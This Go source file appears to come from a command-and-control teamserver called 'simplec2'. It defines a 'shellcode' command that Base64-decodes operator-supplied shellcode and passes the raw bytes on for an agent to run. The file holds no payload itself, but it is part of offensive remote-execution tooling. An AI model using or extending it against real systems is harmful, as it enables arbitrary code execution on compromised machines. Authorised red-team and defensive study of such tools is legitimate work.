package commands

import (
	"encoding/base64"
	"fmt"

	"simplec2/teamserver/data"
)

// CommandIDShellcode Shellcode 命令 ID (与 agent 保持一致)
const CommandIDShellcode uint32 = 15

// ShellcodeCommand implements the CommandConverter interface for the shellcode command.
type ShellcodeCommand struct{}

func init() {
	Register(&ShellcodeCommand{})
}

func (c *ShellcodeCommand) Name() string {
	return "shellcode"
}

func (c *ShellcodeCommand) CommandID() uint32 {
	return CommandIDShellcode
}

func (c *ShellcodeCommand) Convert(task *data.Task) ([]byte, error) {
	// The task.Arguments from the TeamServer is expected to be a Base64 encoded string.
	if task.Arguments == "" {
		return nil, fmt.Errorf("shellcode command requires arguments")
	}

	// Decode Base64
	decoded, err := base64.StdEncoding.DecodeString(task.Arguments)
	if err != nil {
		return nil, fmt.Errorf("failed to decode shellcode (expecting Base64): %v", err)
	}

	return decoded, nil
}
